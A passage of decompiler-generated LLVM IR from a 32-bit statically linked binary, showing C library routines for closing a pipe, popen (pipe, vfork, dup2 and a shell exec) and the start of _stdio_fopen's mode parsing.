  %v15_805b5d4 = icmp eq i32 %v3_805b5d4, %v4_805b5ab
  %v1_805b5d7 = icmp eq i1 %v15_805b5d4, false
  br i1 %v1_805b5d7, label %dec_label_pc_805b5cc, label %dec_label_pc_805b5d9

dec_label_pc_805b5d9:                             ; preds = %dec_label_pc_805b5d4
  %v1_805b5d9 = inttoptr i32 %v2_805b5ce to i32*
  %v2_805b5d9 = load i32, i32* %v1_805b5d9, align 4
  store i32 %v2_805b5d9, i32* %v1_805b5ce, align 4
  br label %dec_label_pc_805b5dd

dec_label_pc_805b5dd:                             ; preds = %entry, %dec_label_pc_805b5b9, %dec_label_pc_805b5b0, %dec_label_pc_805b5d9
  store i32 %v2_805b588, i32* %stack_var_-60, align 4
  %v3_805b5e6 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805b5ee = load i32, i32* @ebx, align 4
  %v1_805b5ee = icmp eq i32 %v0_805b5ee, 0
  br i1 %v1_805b5ee, label %dec_label_pc_805b628, label %dec_label_pc_805b5f2

dec_label_pc_805b5f2:                             ; preds = %dec_label_pc_805b5dd
  %v1_805b5f5 = add i32 %v0_805b5ee, 8
  %v2_805b5f5 = inttoptr i32 %v1_805b5f5 to i32*
  %v3_805b5f5 = load i32, i32* %v2_805b5f5, align 4
  store i32 %v3_805b5f5, i32* @esi, align 4
  store i32 %v0_805b5ee, i32* %stack_var_-60, align 4
  %v1_805b5f9 = call i32 @free(i32 %v0_805b5ee)
  %v0_805b5fe = load i32, i32* @edi, align 4
  store i32 %v0_805b5fe, i32* %stack_var_-60, align 4
  %v1_805b601 = inttoptr i32 %v0_805b5fe to i16*
  %v2_805b601 = call i32 @__GI_fclose(i16* %v1_805b601)
  %v2_805b60c = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_805b609

dec_label_pc_805b609:                             ; preds = %dec_label_pc_805b61e, %dec_label_pc_805b5f2
  %v0_805b609 = phi i32 [ %v1_805b61e, %dec_label_pc_805b61e ], [ %v2_805b601, %dec_label_pc_805b5f2 ]
  %v0_805b611 = load i32, i32* @esi, align 4
  store i32 %v0_805b611, i32* %stack_var_-60, align 4
  %v4_805b612 = call i32 @waitpid(i32 %v0_805b611, i32 %v2_805b60c, i32 0, i32 %v0_805b609)
  %v2_805b61a = icmp slt i32 %v4_805b612, 0
  %v1_805b61c = icmp eq i1 %v2_805b61a, false
  br i1 %v1_805b61c, label %dec_label_pc_805b5c6, label %dec_label_pc_805b61e

dec_label_pc_805b61e:                             ; preds = %dec_label_pc_805b609
  %v0_805b61e = load i32, i32* %stack_var_-60, align 4
  %v1_805b61e = call i32 @__errno_location(i32 %v0_805b61e)
  %v1_805b623 = inttoptr i32 %v1_805b61e to i32*
  %v2_805b623 = load i32, i32* %v1_805b623, align 4
  %v11_805b623 = icmp eq i32 %v2_805b623, 4
  br i1 %v11_805b623, label %dec_label_pc_805b609, label %dec_label_pc_805b628.loopexit

dec_label_pc_805b628.loopexit:                    ; preds = %dec_label_pc_805b61e
  br label %dec_label_pc_805b628

dec_label_pc_805b628:                             ; preds = %dec_label_pc_805b628.loopexit, %dec_label_pc_805b5dd
  br label %dec_label_pc_805b62b

dec_label_pc_805b62b:                             ; preds = %dec_label_pc_805b5c6, %dec_label_pc_805b628
  %storemerge = phi i32 [ -1, %dec_label_pc_805b628 ], [ %v3_805b5c6, %dec_label_pc_805b5c6 ]
  %v2_805b62e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b62e, i32* @ebx, align 4
  store i32 %v0_805b575, i32* @esi, align 4
  store i32 %v0_805b574, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805b61e, { 1, 0 }
  uselistorder i32 %v0_805b5ee, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805b5ce, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @waitpid, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_805b62b, { 1, 0 }
  uselistorder label %dec_label_pc_805b5dd, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805b5cc, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b632 = load i32, i32* @esi, align 4
  %v0_805b633 = load i32, i32* @ebx, align 4
  store i32 %v0_805b633, i32* %stack_var_-8, align 4
  %v15_805b634 = ptrtoint i32* %stack_var_-60 to i32
  %v4_805b637 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805b637, i32* @ebx, align 4
  %v2_805b63b = load i8, i8* %arg2, align 1
  %v3_805b63b = zext i8 %v2_805b63b to i32
  %v4_805b63b = load i32, i32* @eax, align 4
  %v5_805b63b = and i32 %v4_805b63b, -256
  %v6_805b63b = or i32 %v5_805b63b, %v3_805b63b
  store i32 %v6_805b63b, i32* %eax.global-to-local, align 4
  %v10_805b63d = icmp eq i8 %v2_805b63b, 119
  br i1 %v10_805b63d, label %dec_label_pc_805b66c, label %dec_label_pc_805b641

dec_label_pc_805b641:                             ; preds = %entry
  %v10_805b649 = icmp eq i8 %v2_805b63b, 114
  br i1 %v10_805b649, label %dec_label_pc_805b66c, label %dec_label_pc_805b64d

dec_label_pc_805b64d:                             ; preds = %dec_label_pc_805b641
  %v1_805b64d = call i32 @__errno_location(i32 1)
  store i32 %v1_805b64d, i32* %eax.global-to-local, align 4
  %v1_805b652 = inttoptr i32 %v1_805b64d to i32*
  store i32 22, i32* %v1_805b652, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805b823

dec_label_pc_805b66c:                             ; preds = %entry, %dec_label_pc_805b641
  %v0_805b73a = phi i32 [ 1, %dec_label_pc_805b641 ], [ 0, %entry ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_805b671 = call i32 @malloc(i32 12)
  store i32 %v1_805b671, i32* %eax.global-to-local, align 4
  %v1_805b67d = icmp eq i32 %v1_805b671, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_805b67d, label %dec_label_pc_805b823, label %dec_label_pc_805b68c

dec_label_pc_805b68c:                             ; preds = %dec_label_pc_805b66c
  %v2_805b68f = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_805b68f, i32* %eax.global-to-local, align 4
  store i32 %v2_805b68f, i32* %stack_var_-76, align 4
  %v1_805b694 = call i32 @__GI_pipe(i32 %v2_805b68f)
  store i32 %v1_805b694, i32* %eax.global-to-local, align 4
  %v1_805b69c = icmp eq i32 %v1_805b694, 0
  %v1_805b69e = icmp eq i1 %v1_805b69c, false
  br i1 %v1_805b69e, label %dec_label_pc_805b80c, label %dec_label_pc_805b6a4

dec_label_pc_805b6a4:                             ; preds = %dec_label_pc_805b68c
  store i32 %v0_805b73a, i32* %eax.global-to-local, align 4
  %tmp38 = sub nsw i32 0, %v0_805b73a
  %v2_805b6a8 = and i32 %tmp38, 4
  %v3_805b6a8 = add i32 %v15_805b634, 44
  %v4_805b6a8 = add i32 %v3_805b6a8, %v2_805b6a8
  %v5_805b6a8 = inttoptr i32 %v4_805b6a8 to i32*
  %v6_805b6a8 = load i32, i32* %v5_805b6a8, align 4
  %v5_805b6b5 = xor i32 %v0_805b73a, 1
  store i32 %v5_805b6b5, i32* %eax.global-to-local, align 4
  %tmp39 = sub nsw i32 0, %v5_805b6b5
  %v2_805b6b9 = and i32 %tmp39, 4
  %v4_805b6b9 = add i32 %v3_805b6a8, %v2_805b6b9
  %v5_805b6b9 = inttoptr i32 %v4_805b6b9 to i32*
  %v6_805b6b9 = load i32, i32* %v5_805b6b9, align 4
  store i32 %v6_805b6b9, i32* %eax.global-to-local, align 4
  %v0_805b6c1 = load i32, i32* @ecx, align 4
  %v0_805b6c3 = load i32, i32* @ebx, align 4
  %v5_805b6c3 = inttoptr i32 %v0_805b6c3 to i8*
  store i8* %v5_805b6c3, i8** %stack_var_-72, align 4
  store i32 %v6_805b6b9, i32* %stack_var_-76, align 4
  %v5_805b6c5 = call i32 @fdopen(i32 %v6_805b6b9, i32 %v0_805b6c3, i32 %v0_805b6c1, i32 %v0_805b6c1)
  store i32 %v5_805b6c5, i32* %eax.global-to-local, align 4
  store i32 %v5_805b6c5, i32* %stack_var_-60, align 4
  %v1_805b6d1 = icmp eq i32 %v5_805b6c5, 0
  %v1_805b6d3 = icmp eq i1 %v1_805b6d1, false
  br i1 %v1_805b6d3, label %dec_label_pc_805b6f0, label %dec_label_pc_805b6d5

dec_label_pc_805b6d5:                             ; preds = %dec_label_pc_805b6a4
  store i32 %v6_805b6b9, i32* %stack_var_-76, align 4
  %v1_805b6dc = call i32 @__libc_close(i32 %v6_805b6b9)
  store i32 %v1_805b6dc, i32* %eax.global-to-local, align 4
  %v2_805b6e1 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805b6e1, i32* %edx.global-to-local, align 4
  store i32 %v6_805b6a8, i32* %stack_var_-76, align 4
  %v1_805b6e6 = call i32 @__libc_close(i32 %v6_805b6a8)
  br label %dec_label_pc_805b809

dec_label_pc_805b6f0:                             ; preds = %dec_label_pc_805b6a4
  store i8* inttoptr (i32 134585853 to i8*), i8** %stack_var_-72, align 4
  %v2_805b6fb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805b6fb, i32* %eax.global-to-local, align 4
  store i32 %v2_805b6fb, i32* %stack_var_-76, align 4
  %v5_805b700 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_807aee0.692 to i32))
  store i32 %v5_805b700, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807aee0.692 to i32), i32* %stack_var_-76, align 4
  %v1_805b70c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807aee0.692 to i32))
  store i32 %v1_805b70c, i32* %eax.global-to-local, align 4
  %v0_805b711 = load i32, i32* %stack_var_-76, align 4
  %v1_805b711 = call i32 @__vfork(i32 %v0_805b711)
  store i32 %v1_805b711, i32* %eax.global-to-local, align 4
  store i32 %v1_805b711, i32* @ebx, align 4
  %v1_805b71b = icmp eq i32 %v1_805b711, 0
  %v1_805b71d = icmp eq i1 %v1_805b71b, false
  br i1 %v1_805b71d, label %dec_label_pc_805b797, label %dec_label_pc_805b71f

dec_label_pc_805b71f:                             ; preds = %dec_label_pc_805b6f0
  store i32 %v6_805b6b9, i32* %stack_var_-76, align 4
  %v1_805b726 = call i32 @__libc_close(i32 %v6_805b6b9)
  store i32 %v1_805b726, i32* %eax.global-to-local, align 4
  store i32 %v0_805b73a, i32* %edx.global-to-local, align 4
  %v15_805b732 = icmp eq i32 %v6_805b6a8, %v0_805b73a
  br i1 %v15_805b732, label %dec_label_pc_805b751, label %dec_label_pc_805b738

dec_label_pc_805b738:                             ; preds = %dec_label_pc_805b71f
  %v5_805b73a = inttoptr i32 %v0_805b73a to i8*
  store i8* %v5_805b73a, i8** %stack_var_-72, align 4
  store i32 %v6_805b6a8, i32* %stack_var_-76, align 4
  %v5_805b73f = call i32 @dup2(i32 %v6_805b6a8, i32 %v0_805b73a, i32 %v1_805b726, i32 %v1_805b726)
  %v2_805b744 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805b744, i32* %eax.global-to-local, align 4
  store i32 %v6_805b6a8, i32* %stack_var_-76, align 4
  %v1_805b749 = call i32 @__libc_close(i32 %v6_805b6a8)
  store i32 %v1_805b749, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805b751

dec_label_pc_805b751:                             ; preds = %dec_label_pc_805b71f, %dec_label_pc_805b738
  %v0_805b751 = load i32, i32* @global_var_807aef8.693, align 8
  store i32 %v0_805b751, i32* @ebx, align 4
  %v1_805b76c3 = icmp eq i32 %v0_805b751, 0
  %v1_805b76e10 = icmp eq i1 %v1_805b76c3, false
  br i1 %v1_805b76e10, label %dec_label_pc_805b759, label %dec_label_pc_805b770

dec_label_pc_805b759:                             ; preds = %dec_label_pc_805b751, %dec_label_pc_805b759
  %v0_805b759 = phi i32 [ %v2_805b767, %dec_label_pc_805b759 ], [ %v0_805b751, %dec_label_pc_805b751 ]
  %v1_805b759 = add i32 %v0_805b759, 4
  %v2_805b759 = inttoptr i32 %v1_805b759 to i32*
  %v3_805b759 = load i32, i32* %v2_805b759, align 4
  store i32 %v3_805b759, i32* %eax.global-to-local, align 4
  %v1_805b75f = add i32 %v3_805b759, 4
  %v2_805b75f = inttoptr i32 %v1_805b75f to i32*
  %v3_805b75f = load i32, i32* %v2_805b75f, align 4
  store i32 %v3_805b75f, i32* %stack_var_-76, align 4
  %v1_805b762 = call i32 @__libc_close(i32 %v3_805b75f)
  store i32 %v1_805b762, i32* %eax.global-to-local, align 4
  %v0_805b767 = load i32, i32* @ebx, align 4
  %v1_805b767 = inttoptr i32 %v0_805b767 to i32*
  %v2_805b767 = load i32, i32* %v1_805b767, align 4
  store i32 %v2_805b767, i32* @ebx, align 4
  %v1_805b76c = icmp eq i32 %v2_805b767, 0
  %v1_805b76e = icmp eq i1 %v1_805b76c, false
  br i1 %v1_805b76e, label %dec_label_pc_805b759, label %dec_label_pc_805b770

dec_label_pc_805b770:                             ; preds = %dec_label_pc_805b759, %dec_label_pc_805b751
  store i32 0, i32* %stack_var_-76, align 4
  %v8_805b788 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_806caeb.696 to i32), i32 ptrtoint ([3 x i8]* @global_var_806caf0.695 to i32), i32 ptrtoint ([3 x i8]* @global_var_806cae8.694 to i32), i32 %arg1, i32 0)
  store i32 %v8_805b788, i32* %eax.global-to-local, align 4
  store i32 127, i32* %stack_var_-76, align 4
  %v1_805b792 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805b797:                             ; preds = %dec_label_pc_805b6f0
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805b6fb, i32* %stack_var_-76, align 4
  %v4_805b7a0 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_805b7a5 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805b7a5, i32* %eax.global-to-local, align 4
  store i32 %v6_805b6a8, i32* %stack_var_-76, align 4
  %v1_805b7aa = call i32 @__libc_close(i32 %v6_805b6a8)
  store i32 %v1_805b7aa, i32* %eax.global-to-local, align 4
  %v0_805b7b2 = load i32, i32* @ebx, align 4
  %tmp41 = icmp slt i32 %v0_805b7b2, 1
  br i1 %tmp41, label %dec_label_pc_805b7fd, label %dec_label_pc_805b7b6

dec_label_pc_805b7b6:                             ; preds = %dec_label_pc_805b797
  store i32 %v1_805b671, i32* %eax.global-to-local, align 4
  %v2_805b7ba = add i32 %v1_805b671, 8
  %v3_805b7ba = inttoptr i32 %v2_805b7ba to i32*
  store i32 %v0_805b7b2, i32* %v3_805b7ba, align 4
  %v2_805b7bd = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_805b7bd, i32* %edx.global-to-local, align 4
  %v1_805b7c0 = load i32, i32* %eax.global-to-local, align 4
  %v2_805b7c0 = add i32 %v1_805b7c0, 4
  %v3_805b7c0 = inttoptr i32 %v2_805b7c0 to i32*
  store i32 %v2_805b7bd, i32* %v3_805b7c0, align 4
  store i8* inttoptr (i32 134585853 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805b6fb, i32* %stack_var_-76, align 4
  %v5_805b7cf = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_807aee0.692 to i32))
  store i32 %v5_805b7cf, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807aee0.692 to i32), i32* %stack_var_-76, align 4
  %v1_805b7db = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807aee0.692 to i32))
  store i32 %v1_805b671, i32* %edx.global-to-local, align 4
  %v0_805b7e4 = load i32, i32* @global_var_807aef8.693, align 8
  store i32 %v0_805b7e4, i32* %eax.global-to-local, align 4
  %v2_805b7e9 = inttoptr i32 %v1_805b671 to i32*
  store i32 %v0_805b7e4, i32* %v2_805b7e9, align 4
  %v0_805b7eb = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805b7eb, i32* @global_var_807aef8.693, align 8
  %v2_805b7f1 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805b7f1, i32* @ecx, align 4
  %v2_805b7f2 = load i8*, i8** %stack_var_-72, align 4
  %v3_805b7f2 = ptrtoint i8* %v2_805b7f2 to i32
  store i32 %v3_805b7f2, i32* @ebx, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805b6fb, i32* %stack_var_-76, align 4
  %v4_805b7f6 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v4_805b7f6, i32* %eax.global-to-local, align 4
  %v2_805b823.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805b820

dec_label_pc_805b7fd:                             ; preds = %dec_label_pc_805b797
  %v3_805b800 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_805b800, i32* %stack_var_-76, align 4
  %v1_805b804 = inttoptr i32 %v3_805b800 to i16*
  %v2_805b804 = call i32 @__GI_fclose(i16* %v1_805b804)
  br label %dec_label_pc_805b809

dec_label_pc_805b809:                             ; preds = %dec_label_pc_805b6d5, %dec_label_pc_805b7fd
  %storemerge = phi i32 [ %v2_805b804, %dec_label_pc_805b7fd ], [ %v1_805b6e6, %dec_label_pc_805b6d5 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805b80c

dec_label_pc_805b80c:                             ; preds = %dec_label_pc_805b68c, %dec_label_pc_805b809
  store i32 %v1_805b671, i32* %stack_var_-76, align 4
  %v1_805b813 = call i32 @free(i32 %v1_805b671)
  store i32 %v1_805b813, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805b820

dec_label_pc_805b820:                             ; preds = %dec_label_pc_805b7b6, %dec_label_pc_805b80c
  %v2_805b823.pre = phi i32 [ %v2_805b823.pre.pre, %dec_label_pc_805b7b6 ], [ 0, %dec_label_pc_805b80c ]
  br label %dec_label_pc_805b823

dec_label_pc_805b823:                             ; preds = %dec_label_pc_805b66c, %dec_label_pc_805b64d, %dec_label_pc_805b820
  %v2_805b823 = phi i32 [ 0, %dec_label_pc_805b66c ], [ 0, %dec_label_pc_805b64d ], [ %v2_805b823.pre, %dec_label_pc_805b820 ]
  store i32 %v2_805b823, i32* %eax.global-to-local, align 4
  %v2_805b829 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b829, i32* @ebx, align 4
  store i32 %v0_805b632, i32* @esi, align 4
  ret i32 %v2_805b823

; uselistorder directives
  uselistorder i32 %v2_805b823, { 1, 0 }
  uselistorder i32 %v0_805b7b2, { 1, 0 }
  uselistorder i32 %v2_805b767, { 1, 2, 0 }
  uselistorder i32 %v1_805b711, { 1, 0, 2 }
  uselistorder i32 %v6_805b6b9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v6_805b6a8, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_805b68f, { 1, 0, 2 }
  uselistorder i32 %v1_805b671, { 5, 4, 1, 0, 3, 2, 6, 7 }
  uselistorder i32 %v0_805b73a, { 2, 1, 0, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i8** %stack_var_-72, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 ptrtoint (i32* @global_var_807aee0.692 to i32), { 3, 6, 2, 4, 7, 0, 5, 8, 1 }
  uselistorder i32 (i32)* @__GI_pipe, { 1, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805b823, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805b820, { 1, 0 }
  uselistorder label %dec_label_pc_805b80c, { 1, 0 }
  uselistorder label %dec_label_pc_805b809, { 1, 0 }
  uselistorder label %dec_label_pc_805b759, { 1, 0 }
  uselistorder label %dec_label_pc_805b751, { 1, 0 }
  uselistorder label %dec_label_pc_805b66c, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805b82c = load i32, i32* @ebp, align 4
  %v0_805b82d = load i32, i32* @edi, align 4
  %v0_805b82e = load i32, i32* @esi, align 4
  %v0_805b82f = load i32, i32* @ebx, align 4
  store i32 %v0_805b82f, i32* %stack_var_-16, align 4
  %v4_805b833 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805b833, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_805b843 = load i8, i8* %arg2, align 1
  %v3_805b843 = zext i8 %v2_805b843 to i32
  %v4_805b843 = load i32, i32* @eax, align 4
  %v5_805b843 = and i32 %v4_805b843, -256
  %v6_805b843 = or i32 %v5_805b843, %v3_805b843
  store i32 %v6_805b843, i32* %eax.global-to-local, align 4
  %v10_805b845 = icmp eq i8 %v2_805b843, 114
  br i1 %v10_805b845, label %dec_label_pc_805b887, label %dec_label_pc_805b849

dec_label_pc_805b849:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_805b84e = icmp eq i8 %v2_805b843, 119
  br i1 %v10_805b84e, label %dec_label_pc_805b889, label %dec_label_pc_805b852

dec_label_pc_805b852:                             ; preds = %dec_label_pc_805b849
  store i32 1089, i32* @ebx, align 4
  %v10_805b856 = icmp eq i8 %v2_805b843, 97
  br i1 %v10_805b856, label %dec_label_pc_805b889, label %dec_label_pc_805b85a

dec_label_pc_805b85a:                             ; preds = %dec_label_pc_805b902, %dec_label_pc_805b8dc, %dec_label_pc_805b852
  %v0_805b85a = load i32, i32* %stack_var_-16, align 4
  %v1_805b85a = call i32 @__errno_location(i32 %v0_805b85a)
  store i32 %v1_805b85a, i32* %eax.global-to-local, align 4
  %v0_805b85f = load i32, i32* @ebp, align 4
  %v1_805b85f = icmp eq i32 %v0_805b85f, 0
  %v1_805b861 = inttoptr i32 %v1_805b85a to i32*
  store i32 22, i32* %v1_805b861, align 4
  br i1 %v1_805b85f, label %dec_label_pc_805ba4f, label %dec_label_pc_805b86d

dec_label_pc_805b86d:                             ; preds = %dec_label_pc_805b92b, %dec_label_pc_805b85a
  %v0_805b86d = load i32, i32* @ebp, align 4
  %v1_805b86d = add i32 %v0_805b86d, 1
  %v2_805b86d = inttoptr i32 %v1_805b86d to i8*
  %v3_805b86d = load i8, i8* %v2_805b86d, align 1
  %v4_805b86d = and i8 %v3_805b86d, 32
  %v5_805b86d = icmp eq i8 %v4_805b86d, 0
  br i1 %v5_805b86d, label %dec_label_pc_805ba4f, label %dec_label_pc_805b877

dec_label_pc_805b877:                             ; preds = %dec_label_pc_805b86d
  store i32 %v0_805b86d, i32* %stack_var_-76, align 4
  %v1_805b87b = call i32 @free(i32 %v0_805b86d)
  store i32 %v1_805b87b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805ba4a

dec_label_pc_805b887:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805b889

dec_label_pc_805b889:                             ; preds = %dec_label_pc_805b852, %dec_label_pc_805b849, %dec_label_pc_805b887
  %v0_805b89a = phi i32 [ 1089, %dec_label_pc_805b852 ], [ 577, %dec_label_pc_805b849 ], [ 1, %dec_label_pc_805b887 ]
  %v1_805b889 = add i32 %v4_805b833, 1
  store i32 %v1_805b889, i32* %eax.global-to-local, align 4
  %v2_805b88c = inttoptr i32 %v1_805b889 to i8*
  %v3_805b88c = load i8, i8* %v2_805b88c, align 1
  %v12_805b88c = icmp eq i8 %v3_805b88c, 98
  br i1 %v12_805b88c, label %dec_label_pc_805b894, label %dec_label_pc_805b892

dec_label_pc_805b892:                             ; preds = %dec_label_pc_805b889
  store i32 %v4_805b833, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805b894

dec_label_pc_805b894:                             ; preds = %dec_label_pc_805b889, %dec_label_pc_805b892
  %v0_805b894 = phi i32 [ %v1_805b889, %dec_label_pc_805b889 ], [ %v4_805b833, %dec_label_pc_805b892 ]
  %v1_805b894 = add i32 %v0_805b894, 1
  %v2_805b894 = inttoptr i32 %v1_805b894 to i8*
  %v3_805b894 = load i8, i8* %v2_805b894, align 1
  %v12_805b894 = icmp eq i8 %v3_805b894, 43
  %v1_805b898 = icmp eq i1 %v12_805b894, false
  br i1 %v1_805b898, label %dec_label_pc_805b8a2, label %dec_label_pc_805b89a

dec_label_pc_805b89a:                             ; preds = %dec_label_pc_805b894
  store i32 %v0_805b89a, i32* %eax.global-to-local, align 4
  %v1_805b89f = add nuw nsw i32 %v0_805b89a, 1
  store i32 %v1_805b89f, i32* @ebx, align 4
  br label %dec_label_pc_805b8a2

dec_label_pc_805b8a2:                             ; preds = %dec_label_pc_805b894, %dec_label_pc_805b89a
  %v1_805b8a2 = icmp eq i32 %arg3, 0
  %v1_805b8a4 = icmp eq i1 %v1_805b8a2, false
  br i1 %v1_805b8a4, label %dec_label_pc_805b8d8, label %dec_label_pc_805b8a6

dec_label_pc_805b8a6:                             ; preds = %dec_label_pc_805b8a2
  store i32 80, i32* %stack_var_-76, align 4
  %v1_805b8ab = call i32 @malloc(i32 80)
  store i32 %v1_805b8ab, i32* %eax.global-to-local, align 4
  store i32 %v1_805b8ab, i32* @ebp, align 4
  %v2_805b8b5 = icmp eq i32 %v1_805b8ab, 0
  br i1 %v2_805b8b5, label %dec_label_pc_805ba51, label %dec_label_pc_805b8bd

dec_label_pc_805b8bd:                             ; preds = %dec_label_pc_805b8a6
  %v2_805b8ab = inttoptr i32 %v1_805b8ab to i16*
  store i16 8192, i16* %v2_805b8ab, align 2
  %v2_805b8c5 = add i32 %v1_805b8ab, 8
  %v3_805b8c5 = inttoptr i32 %v2_805b8c5 to i32*
  store i32 0, i32* %v3_805b8c5, align 4
  %v2_805b8cc = add i32 %v1_805b8ab, 56
  store i32 %v2_805b8cc, i32* %eax.global-to-local, align 4
  store i32 %v2_805b8cc, i32* %stack_var_-76, align 4
  %v1_805b8d0 = call i32 @__stdio_init_mutex(i32 %v2_805b8cc)
  store i32 %v1_805b8d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805b8d8

dec_label_pc_805b8d8:                             ; preds = %dec_label_pc_805b8a2, %dec_label_pc_805b8bd
  %v2_805b8d8 = icmp slt i32 %arg4, 0
  br i1 %v2_805b8d8, label %dec_label_pc_805b925, label %dec_label_pc_805b8dc

dec_label_pc_805b8dc:                             ; preds = %dec_label_pc_805b8d8
  %v0_805b8dc = load i32, i32* @ebx, align 4
  %v0_805b8de = load i32, i32* @esi, align 4
  %v1_805b8de = add i32 %v0_805b8de, 1
  store i32 %v1_805b8de, i32* %eax.global-to-local, align 4
  %v1_805b8e1 = and i32 %v0_805b8dc, 32771
  store i32 %v1_805b8e1, i32* %edx.global-to-local, align 4
  %v1_805b8e7 = load i32, i32* @ebp, align 4
  %v2_805b8e7 = add i32 %v1_805b8e7, 4
  %v3_805b8e7 = inttoptr i32 %v2_805b8e7 to i32*
  store i32 %arg4, i32* %v3_805b8e7, align 4
  %v0_805b8ea = load i32, i32* %edx.global-to-local, align 4
  %v1_805b8ea = add i32 %v0_805b8ea, 1
  store i32 %v1_805b8ea, i32* %edx.global-to-local, align 4
  %v0_805b8eb = load i32, i32* %eax.global-to-local, align 4
  %v2_805b8eb = and i32 %v0_805b8eb, %v1_805b8ea
  store i32 %v2_805b8eb, i32* %eax.global-to-local, align 4
  %v12_805b8ed = icmp eq i32 %v2_805b8eb, %v1_805b8ea
  %v1_805b8ef = icmp eq i1 %v12_805b8ed, false
  br i1 %v1_805b8ef, label %dec_label_pc_805b85a, label %dec_label_pc_805b8f5

dec_label_pc_805b8f5:                             ; preds = %dec_label_pc_805b8dc
  %v0_805b8f5 = load i32, i32* @esi, align 4
  %v1_805b8f7 = and i32 %v0_805b8f5, 1024
  %v1_805b8f9 = xor i32 %v1_805b8f7, 1024
  store i32 %v1_805b8f9, i32* %eax.global-to-local, align 4
  %v1_805b8fe = load i32, i32* @ebx, align 4
  %v2_805b8fe = and i32 %v1_805b8fe, %v1_805b8f9
  %v3_805b8fe = icmp eq i32 %v2_805b8fe, 0
